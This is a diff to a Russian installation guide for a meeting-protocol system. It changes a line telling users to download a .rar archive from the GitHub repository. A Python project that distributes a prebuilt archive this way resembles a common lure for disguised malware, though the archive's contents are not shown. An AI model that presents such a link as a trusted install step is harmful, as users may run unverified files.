@@ -3,7 +3,7 @@
 
  ИНСТРУКЦИЯ ПО УСТАНОВКЕ 
  # Инструкция по установке системы «Протокол+Распоряжения»
- #скачать файл : https://github.com/diancahya26/MeetingProtocolSystem/blob/main/Meeting_Management_System.rar
+ # Загрузите файл со стрелкой на вашем GitHub : https://github.com/diancahya26/MeetingProtocolSystem/blob/main/Meeting_Management_System.rar
 ## Требования
 - Python 3.11 или выше
 - Интернет (только для первой загрузки модели faster-whisper)
